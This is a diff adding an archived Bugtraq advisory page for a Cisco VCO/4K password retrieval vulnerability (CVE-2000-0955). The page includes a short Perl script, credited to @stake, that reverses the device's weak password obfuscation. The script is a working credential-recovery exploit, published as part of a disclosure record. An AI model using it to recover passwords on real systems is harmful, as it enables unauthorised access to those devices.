@@ -1,0 +1,99 @@
+#bid1885<p><b><span style="font-size: 18pt;">Cisco CVCO/4k Remote Username and Password Retrieval Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1885/info">info</a><br><a href="http://www.securityfocus.com/bid/1885/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1885/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1885/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1885/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1885
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2000-0955<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 26 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 03:56AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Reported to bugtraq by "@stake Advisories" &lt;advisories@atstake.com&gt; on Thu, 26 Oct 2000.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Cisco Virtual Central Office 4000 (VCO/4K) 5.1.3 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Cisco Virtual Central Office 4000 (VCO/4K) 5.1.4 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	&amp;lt;--- cut here ---&amp;gt;<br/>#!/usr/bin/perl<br/><br/>printf ("Cisco VCO/4K Password DeObfuscator\n");<br/>printf ("\t\@stake, Inc.\n");<br/>printf ("\tRex Warren, Brian Carrier, David Goldsmith\n");<br/><br/>printf ("Enter Password: ");<br/>$pw = &amp;lt;STDIN&amp;gt;;<br/>chop $pw;<br/><br/>printf("Result: ");<br/>for ($pos = 0; $pos &amp;lt; length($pw); $pos++){<br/>    printf("%s", chr(164 - ord(substr($pw, $pos, 1))));<br/>}<br/>printf("\n");<br/><br/>&amp;lt;--- cut here ---&amp;gt;
+	
+		<ul>
+</ul>
+</div>
